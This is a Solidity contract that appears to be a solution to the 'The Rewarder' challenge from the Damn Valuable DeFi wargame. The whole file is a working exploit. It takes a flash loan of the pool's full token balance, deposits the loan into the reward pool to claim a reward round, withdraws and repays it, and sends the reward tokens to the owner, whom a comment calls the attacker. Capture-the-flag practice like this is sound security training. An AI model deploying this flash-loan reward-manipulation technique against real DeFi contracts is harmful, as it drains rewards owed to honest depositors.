// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";


contract RewardEvilReceiver is Ownable {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewardPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    constructor(FlashLoanerPool _flashLoanPool, TheRewarderPool _rewardPool, DamnValuableToken _liquidityToken, RewardToken _rewardToken) {
        flashLoanPool = _flashLoanPool;
        rewardPool = _rewardPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 borrowAmount) public {
        require(msg.sender == address(flashLoanPool), "only pool");

        liquidityToken.approve(address(rewardPool), borrowAmount);

        rewardPool.deposit(borrowAmount);

        rewardPool.withdraw(borrowAmount);

        // repay borrow 
        bool repayResult = liquidityToken.transfer(address(flashLoanPool), borrowAmount);
        require(repayResult, "repay borrow failed");

        // transfer reward token to attacker
        uint balance = rewardToken.balanceOf(address(this));
        bool withdrawRewardResult = rewardToken.transfer(address(owner()), balance);
        require(withdrawRewardResult, "reward sent to attacker failed");
    }

    function flashLoan() public onlyOwner {
        uint balance = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(balance);
    }

    


}